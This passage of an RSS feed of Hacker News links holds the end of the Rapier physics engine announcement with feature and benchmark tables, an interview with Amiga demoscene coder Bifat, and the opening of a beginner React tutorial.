disk or sent through network.</li><li><strong>Cross-platform determinism</strong>: if the <code>enhanced-determinism</code> feature of <strong>Rapier</strong> is enabled, it will behave in
a <em>bit-level cross-platform deterministic</em> way in all platforms that comply with the IEEE 754-2008 floating point standard.
This means that if you run the same simulation with the same initial states on two different machines (or browsers)
you will get the exact same results. Here "bit-level" determinism means that if you serialize the physics state after the
same number of timesteps on two different machines, you will obtain the exact same byte array for both: you may compute a checksum
of both snapshots and they will be identical. All this doesn't apply to platforms with pointer size smaller than 32-bit, and on
platforms that don't comply to IEEE&nbsp;754-2008 strictly.</li></ol><p>See <a href="#feature-comparison-with-nphysics">that section</a> for a comparison between Rapier and nphysics features.</p><h3>Reaching out to other communities: Bevy and JavaScript</h3><p><img src="https://www.dimforge.com/img/bevy_wasm_js.svg" alt="Bevy WASM JS"></p><p>Writing a physics engine is hard. There are not a lot of choices out there and most of them are written in C++. With
<strong>nphysics</strong> we wanted to provide an open-source 100% rust physics solution for the Rust community.
With <strong>Rapier</strong> we want to go one step further by contributing to as many communities in need of a physics engine as we can. This is why we are
starting, right at the beginning of the <strong>Rapier</strong> story, by providing:</p><ul><li>Official <strong>JavaScript bindings</strong> for the WASM version of <strong>Rapier</strong>. These binding are generated using <code>wasm_bindgen</code> and
are published to NPM as the packages <a href="https://www.npmjs.com/package/@dimforge/rapier3d" target="_blank" rel="noopener noreferrer">@dimforge/rapier3d</a> and
<a href="https://www.npmjs.com/package/@dimforge/rapier2d" target="_blank" rel="noopener noreferrer">@dimforge/rapier2d</a>. While multiple physics solutions already exist
for JavaScript they are either slow (because they are manually written in JS like <strong>cannon.js</strong> or <strong>oimo.js</strong>), or not
officially maintained by their original developers (because they are ported from C++ using Emscripten, like <strong>box2d.wasm</strong>,
<strong>ammo.wasm</strong>, or <strong>physx.wasm</strong>). By providing official wasm builds and JS bindings, we are making sure to provide the
best support, documentation, and continuous updates to the JS community.</li><li>Official <strong>plugins for the <a href="https://bevyengine.org/" target="_blank" rel="noopener noreferrer">Bevy</a></strong> game engine. They are available as the
<a href="https://crates.io/crates/bevy_rapier2d" target="_blank" rel="noopener noreferrer">bevy_rapier2d</a> and <a href="https://crates.io/crates/bevy_rapier3d" target="_blank" rel="noopener noreferrer">bevy_rapier3d</a>
crates. The <strong>Bevy</strong> game engine has recently been released as an efficient, fast-to-compile, and easy to use, data-oriented
game engine. It is still at its early state and is lacking any physics feature. We believe physics support is a very high-value
feature to have in a game engine. By providing official plugins we want to make sure the <strong>Bevy</strong> community can benefit from the
<strong>Rapier</strong> physics engines quickly and easily.</li></ul><p>There are so many more communities we would like to contribute to but don't have manpower to support all of them just now.
Other integrations and languages will come in the future.</p><p>We also plan to create official plugins for the <strong>Amethyst</strong> game engine but have not started yet. We are waiting
for the migration of <strong>Amethyst</strong> to the <a href="https://crates.io/crates/legion" target="_blank" rel="noopener noreferrer">legion</a> ECS solution before starting to work
on this.</p><div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</h5></p><p>Examples using the 2D JS bindings are available on GitHub:
<a href="https://github.com/dimforge/rapier.js/tree/master/testbed2d/src/demos" target="_blank" rel="noopener noreferrer">2D</a> and
<a href="https://github.com/dimforge/rapier.js/tree/master/testbed3d/src/demos" target="_blank" rel="noopener noreferrer">3D</a>. You can see these demos running
<a href="https://rapier.rs/demos2d/index.html" target="_blank" rel="noopener noreferrer">there for 2D</a> and <a href="https://rapier.rs/demos3d/index.html" target="_blank" rel="noopener noreferrer">there for 3D</a>.
In these demos, the physics simulation runs inside of a web worker and the rendering is performed by
<a href="https://www.pixijs.com/" target="_blank" rel="noopener noreferrer">PixiJS</a> and <a href="https://threejs.org/" target="_blank" rel="noopener noreferrer">Three.js</a>.</p></div><h3>Feature comparison with nphysics</h3><p><strong>Rapier</strong> does not have as many features as <strong>nphysics</strong> yet, but it also has a few features <strong>nphysics</strong> does not have.
Here are comparative tables of both physics engines: </p><center><table><thead><tr><th>Dynamics features</th><th>Rapier</th><th>nphysics</th></tr></thead><tbody><tr><td>Rigid-body physics</td><td>✅</td><td>✅</td></tr><tr><td>Kinematic bodies</td><td>✅</td><td>✅</td></tr><tr><td>Rigid-body islands and sleeping</td><td>✅</td><td>✅</td></tr><tr><td>Joint constraints</td><td>✅</td><td>✅</td></tr><tr><td>Joint constraint limits and motors</td><td>❌</td><td>❌</td></tr><tr><td>Reduced-coordinate joints</td><td>❌</td><td>✅</td></tr><tr><td>Reduced-coordinates joint limits and motors</td><td>❌</td><td>✅</td></tr><tr><td>Conveyor belts</td><td>❌</td><td>✅</td></tr><tr><td>Deformable bodies</td><td>❌</td><td>✅</td></tr><tr><td>Fluids (integration with <a href="https://salva.rs/" target="_blank" rel="noopener noreferrer">Salva</a>)</td><td>❌</td><td>✅</td></tr></tbody></table></center><center><table><thead><tr><th>Geometry features</th><th>Rapier</th><th>nphysics</th></tr></thead><tbody><tr><td>Colliders</td><td>✅</td><td>✅</td></tr><tr><td>Sensors</td><td>✅</td><td>✅</td></tr><tr><td>Contact/proximity events</td><td>✅</td><td>✅</td></tr><tr><td>Contact graph</td><td>✅</td><td>✅</td></tr><tr><td>Continuous Collision Detection</td><td>❌</td><td>✅</td></tr><tr><td>Ray-casting</td><td>❌</td><td>✅</td></tr><tr><td>Convex-casting</td><td>❌</td><td>✅</td></tr></tbody></table></center><center><table><thead><tr><th>Performance and portability features</th><th>Rapier</th><th>nphysics</th></tr></thead><tbody><tr><td>Floating-point cross-platform determinism</td><td>✅</td><td>❌</td></tr><tr><td>Parallelization</td><td>✅</td><td>❌</td></tr><tr><td>SIMD</td><td>✅</td><td>❌</td></tr><tr><td>Serialization</td><td>✅</td><td>❌</td></tr><tr><td><strong>JavaScript</strong> bindings</td><td>✅</td><td>❌</td></tr><tr><td>Integration to <strong>Bevy</strong></td><td>✅</td><td>❌</td></tr><tr><td>Integration to <strong>Amethyst</strong></td><td>❌</td><td>❌</td></tr><tr><td>Fixed-point cross-platform determinism</td><td>❌</td><td>✅</td></tr><tr><td>64-bits physics</td><td>❌</td><td>✅</td></tr></tbody></table></center><p>Today <strong>nphysics</strong> is more mature than <strong>Rapier</strong>. Our first goal during the next few months is to bring <strong>Rapier</strong> at the
same level as <strong>nphysics</strong> featurewise, while keeping the significant performance improvements and better accuracy.</p><h3>Benchmarks</h3><p>Alright, we claimed that <strong>Rapier</strong> is nearly as fast as the CPU version of PhysX, 5 to 10 times faster than nphysics, and
slightly faster than Box2D. It is now time to prove these claims using benchmarks.</p><div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</h5></p><p>Keep in mind that <strong>Rapier</strong> is still at a early development stage. It does not have as many features as the ofther
physics engines involved in this benchmark. However, our objective is to ensure that the future addition of new features
to <strong>Rapier</strong> don't reduce the level of perfomance you see here.</p></div><p>In the subsequent benchmarks we ran a set of stress tests using four different physics engines:</p><ol><li><strong>Rapier</strong> using our <a href="https://crates.io/crates/rapier3d" target="_blank" rel="noopener noreferrer">rapier3d</a> crate for 3D and <a href="https://crates.io/crates/rapier2d" target="_blank" rel="noopener noreferrer">rapier2d</a> for 2D.</li><li><strong>PhysX 4</strong> using the <a href="https://crates.io/crates/physx" target="_blank" rel="noopener noreferrer">physx</a> crate.</li><li><strong>Box2d</strong> using the <a href="https://crates.io/crates/wrapped2d" target="_blank" rel="noopener noreferrer">wrapped2d</a> crate.</li><li><strong>nphysics</strong> using our <a href="https://crates.io/crates/nphysics3d" target="_blank" rel="noopener noreferrer">nphysics3d</a> crate for 3D and <a href="https://crates.io/crates/nphysics2d" target="_blank" rel="noopener noreferrer">nphysics2d</a> for 2D</li></ol><p>Independently of the chosen physics engine, all scenes are always initialized in the
exact same way (same bodies, same colliders at the same initial positions) and with the following
parameters:</p><ul><li><strong>Rust compiler and flags</strong>: <code>rustc 1.46.0-nightly</code>, <code>--release</code>, <code>--features simd-nightly</code>, <code>codegen-units = 1</code>.</li><li><strong>Timestep length</strong>: 0.016 (i.e. 16 milliseconds).</li><li><strong>Number of velocity iterations</strong>: 4 for Rapier, nphysics, and Box2D. 1 for PhysX.</li><li><strong>Number of position iterations</strong>: 1 from Rapier, nphysics, and Box2D. 4 for PhysX.</li><li><strong>Targets</strong>: native CPU (WebAssembly versions and PhysX on GPU have not been benchmarked.)</li><li><strong>Solvers</strong>: variations of PGS. (The PhysX 4.0 TGS solver has not been benchmarked. We used the default <code>ePGS</code> solver.)</li><li><strong>Number of threads</strong>: 1.</li></ul><div><p><h5><span><svg xmlns="http://www.w3.org/2000/svg" width="14" height="16" viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>note</h5></p><p>In this benchmark we don't use multithreading. A benchmark with multithreading enabled, involving only multithread physics
engine will be the subject of another blog post.</p></div><p>Each 3D benchmark is run on two different machines because we observed performance differences between
PhysX and Rapier depending on the processor:</p><ol><li>A desktop computer, running Ubuntu, equipped with an AMD Ryzen 9 3900X CPU, 3.8GHz.</li><li>A MacBook Pro (plugged to a power outlet), running Mac OS, equipped with an Intel Core i7 7920HQ, 3.1GHz.</li></ol><p>The 2D benchmarks are run only on the AMD Ryzen 9 3900X CPU (the relative performance remain the same with
the Inter Core i7 CPU).</p><h3>3D Benchmark: Rapier vs. PhysX vs. nphysics</h3><p>A few notes are in order regarding PhysX in this benchmark. First, we don't use the same number of iterations for Rapier and PhysX.
For Rapier and nphysics we use 4 velocity iterations and 1 position iteration. It is the other way round for PhysX: 1 velocity
iteration and 4 position iterations. This is the most sensible configuration because:</p><ul><li>PhysX developers <a href="http://www.codercorner.com/blog/?p=2072" target="_blank" rel="noopener noreferrer">advise to increase</a> the number of position iterations for
better stability, and leave to 1 the number of velocity iterations.</li><li>PhysX itself (independently from this benchmark) uses 1 velocity iteration and 4 position iterations by default.
It yields more stable simulations than using 4 velocity and 1 position without performance difference.</li><li>Rapier and nphysics use a solver different from PhysX's. With our solver, it is recommended to increase the number of
velocity iterations instead of position iterations, and leave the number of position iterations to 1.</li></ul><p>The PhysX benchmarks will include two performance curves:</p><ol><li>One performance curve using their default <code>ePATH</code> friction model. This is a simplified friction model, faster to
compute, but less realistic. Rapier and nphysics don't implement a similar model yet.</li><li>One performance curve using their <code>eTWO_DIRECTIONAL</code> friction model. This is similar to the friction model used by Rapier
and nphysics.</li></ol><h4>8.000 stacked balls</h4><p>In this benchmark there are 8000 balls falling on a ground also composed of balls. In the end, they form 400
independent small stacks of balls.
<img src="https://www.dimforge.com/img/bench_balls.png" alt="bench balls">
<img src="https://www.dimforge.com/img/bench_ryzen_balls.svg" alt="bench balls">
<img src="https://www.dimforge.com/img/bench_intel_balls.svg" alt="bench balls"></p><h4>3.000 falling boxes</h4><p>In this benchmark, there are about 3000 small cubes falling on a large cube floor in a completely …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.dimforge.com/blog/2020/08/25/announcing-the-rapier-physics-engine/">https://www.dimforge.com/blog/2020/08/25/announcing-the-rapier-physics-engine/</a></em></p>]]>
            </description>
            <link>https://www.dimforge.com/blog/2020/08/25/announcing-the-rapier-physics-engine/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24276785</guid>
            <pubDate>Tue, 25 Aug 2020 22:08:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interview with Bifat / the Electronic Knights]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24276569">thread link</a>) | @doener
<br/>
August 25, 2020 | https://www.amigalife.org/index.php?topic=189.0 | <a href="https://web.archive.org/web/*/https://www.amigalife.org/index.php?topic=189.0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
								<div id="msg_335"><p><strong>Hello Bifat. Could you please introduce yourself to our readers?<br></strong><br>Hi, my name is Timm, I live in Berlin, I started as a member of TEK in 1991 on the Amiga. I did graphics for a few weeks, then I switched my main profession to coding. I left TEK in about 2004 with my then girlfriend Blue to do Playstation 2 demos as Neoscientists. In 2016 I returned to TEK to do demos on the Amiga again. In 2018 I joined K2 as my second group.</p><p><strong>When did you get interested in computers and what was your first computer?<br></strong><br>I got interested in computers because my uncle was a construction engineer, and he had a PET in his office. He used a sort of finite elements method to calculate the hulls of nuclear power plants with it. I was promised to be given the PET when it would be taken out of service. Then the C64 came out and seemed more appropriate. It was some kind of a family effort to finance the C64 very early.</p><p><strong>What Amiga(s) did you have in the past and if you remember, what were the(ir) configuration(s)?<br></strong><br>My first Amiga was an Amiga 500, Kick 1.2, soon with a 1.8mb memory expansion, then I replaced the ROM with Kick 1.3, so I could add an ALF controller and a second-hand 30mb harddisk. In 1990 I got an Amiga 3000, which was extremely expensive. It was an early model shipped with a SuperKickstart disk and very buggy Kick 2.01. Initially it had 6mb RAM, a 210mb SCSI harddisk. This became my main computer for more than 10 years. Over the years Blue and I had about five A3000s altogether, most of them expanded with 68060s, gfx and network cards.</p><p><strong>Do you still have any Amiga(s) today? If yes, which ones and what configuration(s) <br></strong><br>I have an A500, Rev. 5, Kick 1.2, 0,5mb fake fast, 1084s monitor, no other extensions or modifications. This is my machine for final testing of my stuff for "OCS" compliance. I have another A500 with an ACA500+ and an XSurf500 network module. My main computer for coding is an A600 with 2mb of chipmem and a PCMCIA network adapter. Also I have two A3000s, of which one is in regular use. Also I have an A1200, but only for testing my OCS stuff for AGA compatibility. All Amigas except one are in my network, and I use real disk drives and disks on all Amigas.</p><p><strong>Can you tell us how you got involved with the demoscene?<br></strong><br>I lived in a small town in Hesse, Germany. In this town there was an uncanny concentration of early computer scene people. Most of them were two or three years older than me. They founded TEK on the C64. I didn't know them at first. In my own grade there was a very active Amiga guy running a BBS since 1987/88 or so. He supplied me with manuals and tools and so I learned C and assembler and did "serious" programming on the Amiga first. In around 1990 I got to know the other scene people in this town, and being among the more proficient, I got nice support from the others and was well integrated when TEK took off on the Amiga. Also noteworthy is that from the same town our C16/Plus4 section originated, with people who were slightly younger than me.</p><p><strong>Can you tell us a bit about the story behind your group TEK?<br></strong><br>It was founded on the C64 in 1987 by White Knight, Banana, and Mac and possibly a few others, who were all from this town. From White Knight came a part of its name. TEK was more on the creative side of things, known for great music, funny ideas and weird humor. TEK also did cracks and was very active in swapping, and on the C64, the group went into hibernation due to problems with the police, but reappeared shortly thereafter on the Amiga, when I and a few others joined.&nbsp; We brought some new, different attitudes into the group, but Banana's and Mac's punk-like, brazen spirit and humor were still alive and continued to shape the group. With Blue I shared some interesting times, as I introduced her to assembler and demo coding on the Amiga, and when she got it, she asked me to join her making demos on the PS2.</p><p><strong>Do you remember which tools you used back when you started out, and what are you using these days for development?<br></strong><br>Early: Aztec C, Seka, DPaint, AsmOne, Noisetracker, Protracker. Middle ages: DevPac, SAS/C, AsmOne, PPaint, TVPaint, Protracker. Now: Linux, vasm, Lua, PPaint, Protracker, Inkscape, Grafx2. I'm using a toolchain that I mostly wrote myself, plus shell and editor. I use vasm (with a few modifications) for cross-coding, and run the stuff on a real Amiga on fixed addresses using a TCP server. I also wrote a cross cruncher, which later got released as 'Cranker', and I use my own Lua-based macro<br>language 'DemoPHP'. In DemoPHP I can for example calculate tables and do on-the-fly image processing. My workflow is often that I prototype an effect in Lua, which I then slap into an assembler source.</p><p><strong>Do you have some tips for anyone that might want to start doing Amiga productions in 2020?<br></strong><br>Yes. I recommend getting a real Amiga and connect it to the network. Then you can work on the real machine using an assembler like AsmOne, or you can use vasm on a PC and start your work directly from a network share, e.g. using smbfs. Use for example an A500/ACA500+, A600, or an A1200. You can use an emulator as an additional tool, but do not code against it primarily. Don't let yourself get distracted by too much framework stuff, IDE integration and PC side peculiarities, that's<br>beside the point I think.</p><p><strong>What would you consider the best production you worked on and why?<br></strong><br>Elevation, 2016 slideshow. Here everything just worked perfectly. Artistically and technically it fell into place like never before, thanks to Blue (pictures and texts), Blueberry and TTY (help on compression). It was finished literally on the last day.</p><p><strong>Can you tell us what you consider the best Amiga demos back in the golden years? as well as now<br></strong><br>There are too many good, underrated, even mostly forgotten works, not only the usual suspects. To give you an idea: Vector Exterminator, Sound Vision, Absolute Inebriation, Boundless Void... I don't want to name recent productions, because they are too fresh to put labels on them, and it might hurt some people if their productions are not mentioned also. There is not the one and only way of making demos, part of the fun is the multitude of formats and approaches. And by the way, I also appreciate Atari ST/STe demos a lot.</p><p><strong>What do you think of the state of the demo scene today?<br></strong><br>It was in a good shape until the Covid-19 craze, to which most governments reacted in the wrong way. It remains to be seen if we can get back on our feet and what the repercussions are. The parties make little sense without demos, and the demos make little sense without parties. In the long term we are losing people to "getting a life", which is actually an euphemism for something closer to death. But there are also people discovering (or remembering) that making demos and showing them off at international parties might be one of the finest hobbies they'll ever find.</p><p><strong>What do you feel you got out of the whole experience of being active in the Amiga demoscene? for example, did it lead you to code professionally in any way?<br></strong><br>From the demoscene emerged a certain mindset in me as much as I was attracted to it due to this mindset. Optimization and the desire to try impossible things are deeply engrained into my thinking. I hate wasting resources. I like to spend huge amounts of time and work for all sorts of crazy research, but practicability always wins in the end. This was all very helpful in life. I have been working with computers professionally from a young age, and I never really did something I didn't like.</p><p><strong>Is there anyone you would like to send some greetings to? Or perhaps you have some other last words?<br></strong><br>Greetings to all. Thank you for keeping the demoscene alive. This especially goes to the organizers of parties. Your work is appreciated, too.</p><p><strong>That is the end of this interview, thanks for taking the time to do it Bifat, I am sure our readers will appreciate it <img src="https://amigalife.org/Smileys/default/smiley.gif" alt=":)" title="Smiley">.</strong></p></div>
							</div></div>]]>
            </description>
            <link>https://www.amigalife.org/index.php?topic=189.0</link>
            <guid isPermaLink="false">hacker-news-small-sites-24276569</guid>
            <pubDate>Tue, 25 Aug 2020 21:48:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Minimal React: getting started with the front end library]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24276175">thread link</a>) | @joeyespo
<br/>
August 25, 2020 | https://2ality.com/2020/08/minimal-react.html | <a href="https://web.archive.org/web/*/https://2ality.com/2020/08/minimal-react.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This blog post explains how to get started with React while using as few libraries as possible.</p>
<!--more-->
<hr>
<p><strong>Table of contents:</strong></p>
<nav><ul><li><a href="#required-knowledge">Required knowledge&nbsp;&nbsp;</a></li><li><a href="#about-this-blog-post">About this blog post&nbsp;&nbsp;</a></li><li><a href="#the-repository">The repository&nbsp;&nbsp;</a></li><li><a href="#what-is-react%3F">What is React?&nbsp;&nbsp;</a><ul><li><a href="#the-traditional-model-view-controller-(mvc)-approach">The traditional model-view-controller (MVC) approach&nbsp;&nbsp;</a></li><li><a href="#react">React&nbsp;&nbsp;</a></li></ul></li><li><a href="#first-example%3A-counting-clicks">First example: counting clicks&nbsp;&nbsp;</a><ul><li><a href="#adding-the-user-interface-to-the-html-page">Adding the user interface to the HTML page&nbsp;&nbsp;</a></li><li><a href="#creating-user-interface-elements">Creating user interface elements&nbsp;&nbsp;</a><ul></ul></li><li><a href="#the-component-countingclicks()">The component CountingClicks()&nbsp;&nbsp;</a><ul></ul></li></ul></li><li><a href="#second-example%3A-expandable-sections">Second example: expandable sections&nbsp;&nbsp;</a><ul><li><a href="#user-interface-component-sections()">User interface component Sections()&nbsp;&nbsp;</a></li><li><a href="#user-interface-component-section()">User interface component Section()&nbsp;&nbsp;</a><ul></ul></li><li><a href="#exercises">Exercises&nbsp;&nbsp;</a></li></ul></li><li><a href="#third-example%3A-quiz">Third example: quiz&nbsp;&nbsp;</a><ul><li><a href="#the-model">The model&nbsp;&nbsp;</a></li><li><a href="#immer">Immer&nbsp;&nbsp;</a></li><li><a href="#the-root-controller-pattern">The root controller pattern&nbsp;&nbsp;</a></li><li><a href="#the-user-interface-components">The user interface components&nbsp;&nbsp;</a><ul></ul></li><li><a href="#exercises-2">Exercises&nbsp;&nbsp;</a></li></ul></li><li><a href="#how-does-snowpack-work%3F">How does Snowpack work?&nbsp;&nbsp;</a><ul><li><a href="#building">Building&nbsp;&nbsp;</a></li></ul></li><li><a href="#conclusion">Conclusion&nbsp;&nbsp;</a><ul><li><a href="#state-management-via-the-root-controller-pattern">State management via the root controller pattern&nbsp;&nbsp;</a></li><li><a href="#next-steps">Next steps&nbsp;&nbsp;</a></li><li><a href="#learning-more-about-the-react-ecosystem">Learning more about the React ecosystem&nbsp;&nbsp;</a></li></ul></li></ul></nav><hr>
<h2 id="required-knowledge">Required knowledge&nbsp;&nbsp;</h2>
<p>Things you should know before reading this blog post:</p>
<ul>
<li>JavaScript: You should have already written code in that language.</li>
<li>Browser DOM (document object model): It helps if you are loosely familiar with how the DOM represents HTML and how it handles events.</li>
<li>npm: It also helps if you have a basic understanding of the npm package manager for Node.js.</li>
</ul>
<h2 id="about-this-blog-post">About this blog post&nbsp;&nbsp;</h2>
<p>Many tutorials provide comprehensive introductions to the React ecosystem. I wanted to try something different:</p>
<blockquote>
<p>What is the smallest set of libraries that allows you to be productive in React?</p>
</blockquote>
<p>This is an exhaustive list of the npm packages that the code in this blog post depends on:</p>
<ul>
<li><a href="https://www.snowpack.dev/">Build tool <em>Snowpack</em></a>:
<ul>
<li><code>snowpack</code></li>
<li><code>@snowpack/plugin-react-refresh</code></li>
</ul>
</li>
<li><a href="https://reactjs.org/">User interface library <em>React</em></a>:
<ul>
<li><code>react</code></li>
<li><code>react-dom</code></li>
</ul>
</li>
<li><a href="https://github.com/developit/htm">React helper library <em>HTM</em></a> (to specify user interfaces via an HTML-like syntax):
<ul>
<li><code>htm</code></li>
</ul>
</li>
<li><a href="https://immerjs.github.io/immer/docs/introduction">Library <em>Immer</em></a> for non-destructively updating data:
<ul>
<li><code>immer</code></li>
</ul>
</li>
</ul>
<h2 id="the-repository">The repository&nbsp;&nbsp;</h2>
<p>The repository <a href="https://github.com/rauschma/minimal-react"><code>minimal-react</code></a> contains the examples that we are exploring in this blog post:</p>
<ul>
<li>You can try out the examples <a href="https://rauschma.github.io/minimal-react/build/">online</a>.</li>
<li>You can install it locally to play with the complete setup. Everything is installed inside a single directory, so it’s easy to remove later on.</li>
<li>However, installing the repository is not required for following this blog post. All relevant data is quoted inside the post.</li>
</ul>
<p>The repository has the following structure:</p>
<ul>
<li><code>minimal-react/</code>
<ul>
<li><code>html/</code>: HTML files</li>
<li><code>js/</code>: JavaScript code</li>
<li><code>README.md</code>: Instructions for installing and running the project</li>
<li><code>package.json</code>: Configuring the npm package manager</li>
<li><code>snowpack.config.json</code>: Configuring the Snowpack build tool</li>
</ul>
</li>
</ul>
<p><code>package.json</code> specifies the npm packages that the JavaScript code depends on:</p>
<pre><code>"devDependencies": {
  "@snowpack/plugin-react-refresh": "^2.1.0",
  "snowpack": "^2.9.0"
},
"dependencies": {
  "htm": "^3.0.4",
  "immer": "^7.0.7",
  "react": "^16.13.1",
  "react-dom": "^16.13.1"
}
</code></pre>
<p><code>package.json</code> also defines two scripts:</p>
<pre><code>"scripts": {
  "start": "snowpack dev",
  "build": "snowpack build"
},
</code></pre>
<p>These are executed via:</p>
<ul>
<li>Starting the development web server: <code>npm run start</code>
<ul>
<li>Abbreviated: <code>npm start</code></li>
</ul>
</li>
<li>Creating a standalone application (that runs without the development server): <code>npm run build</code></li>
</ul>
<h2 id="what-is-react%3F">What is React?&nbsp;&nbsp;</h2>
<p>React is a library for creating user interfaces in web browsers. Before we take a look at how it works, let us remind ourselves how user interfaces are created if they are based on a traditional model-view-controller approach.</p>
<h3 id="the-traditional-model-view-controller-(mvc)-approach">The traditional model-view-controller (MVC) approach&nbsp;&nbsp;</h3>
<p>Traditional MVC-based user interfaces work as follows:</p>
<ul>
<li>A tree of user interface components is created once.</li>
<li>Each user interface component manages its own state and updates it incrementally, in response to user interactions.</li>
<li>So-called “glue code”&nbsp;propagates state changes across UI components.</li>
</ul>
<p>This approach has downsides:</p>
<ul>
<li>The user interface logic is often scattered across the code.</li>
<li>Cross-component changes are difficult to implement.</li>
<li>It’s easy to introduce inconsistencies because there can be many different combinations of states.</li>
</ul>
<h3 id="react">React&nbsp;&nbsp;</h3>
<p>React works differently:</p>
<ul>
<li>The user interface is encoded as a data structure that is similar to the <em>document object model (DOM)</em> used by browsers to represent HTML. That data structure is called <em>virtual DOM</em>.</li>
<li>There is a single (nested) model for the complete user interface.</li>
<li>A user interface component is simply a function that maps a model to a user interface.
<ul>
<li>The root component has as input the whole model and passes on parts of that model to subcomponents (which are also functions).</li>
</ul>
</li>
<li>When the user interacts with the UI, the model is changed accordingly and the complete user interface is recreated (by invoking the root component again).
<ul>
<li>To make this viable, performance-wise, React compares the virtual DOM returned by the root component with the current browser DOM. It only changes the latter where the former differs.</li>
</ul>
</li>
</ul>
<p>Benefits of this approach:</p>
<ul>
<li>It’s easier to understand the user interface logic.</li>
<li>Cross-component dependencies are easier to implement.</li>
<li>The data flow is simpler: always from the top of the user interface component tree to its bottom.</li>
</ul>
<h2 id="first-example%3A-counting-clicks">First example: counting clicks&nbsp;&nbsp;</h2>
<p>The first example is in the file <code>minimal-react/html/counting-clicks.html</code>.</p>
<h3 id="adding-the-user-interface-to-the-html-page">Adding the user interface to the HTML page&nbsp;&nbsp;</h3>
<p>This is the body of the HTML page:</p>
<pre><code><span>&lt;<span>h1</span>&gt;</span>Counting clicks<span>&lt;/<span>h1</span>&gt;</span>
<span>&lt;<span>div</span> <span>id</span>=<span>"root"</span>&gt;</span><span>&lt;/<span>div</span>&gt;</span>
<span>&lt;<span>script</span> <span>type</span>=<span>"module"</span> <span>src</span>=<span>"../js/counting-clicks.js"</span>&gt;</span><span>&lt;/<span>script</span>&gt;</span>
</code></pre>
<p>This is how <code>minimal-react/js/counting-clicks.js</code> adds its user interface to the web page:</p>
<pre><code><span>import</span> ReactDOM <span>from</span> <span>'react-dom'</span>;
<span>import</span> {html} <span>from</span> <span>'htm/react'</span>;
<span>import</span> {useState} <span>from</span> <span>'react'</span>;



ReactDOM.render(
  html<span>`&lt;<span>${CountingClicks}</span> rootModel=<span>${rootModel}</span> /&gt;`</span>, 
  <span>document</span>.getElementById(<span>'root'</span>)); 
</code></pre>
<ul>
<li>Line A is how we create user interface elements (via the virtual DOM). Read on for more information.</li>
<li>Line B is the HTML element in which React creates the user interface.</li>
</ul>
<h3 id="creating-user-interface-elements">Creating user interface elements&nbsp;&nbsp;</h3>
<p>Consider the following syntax from the previous example:</p>
<pre><code>html<span>`&lt;<span>${CountingClicks}</span> rootModel=<span>${rootModel}</span> /&gt;`</span>
</code></pre>
<p>There are two layers to this syntax.</p>
<h4 id="syntactic-layer-1%3A-tagged-templates">Syntactic layer 1: tagged templates&nbsp;&nbsp;</h4>
<p><code>html`···`</code> is a <a href="https://exploringjs.com/impatient-js/ch_template-literals.html#tagged-templates"><em>tagged template</em></a>. Tagged templates are a JavaScript language feature that lets us embed foreign syntax in JavaScript code. Each tagged template is actually a function call – for example:</p>
<pre><code><span>const</span> numberOfFruits = <span>4</span>;
<span>const</span> nameOfFruits = <span>'strawberries'</span>;
<span>const</span> result = someFunc<span>`I have <span>${numberOfFruits}</span> <span>${nameOfFruits}</span>!`</span>;
</code></pre>
<p>The the last line is equivalent to:</p>
<pre><code><span>const</span> result = someFunc([<span>'I have '</span>, <span>' '</span>, <span>'!'</span>], numberOfFruits, nameOfFruits);
</code></pre>
<p>Tag functions such as <code>someFunc()</code> can return arbitrary values and are usually guided by their input. In this case, the input is:</p>
<ul>
<li>The <em>template strings</em> <code>['I have ', ' ', '!']</code> are static (the same each time this particular function call is made)</li>
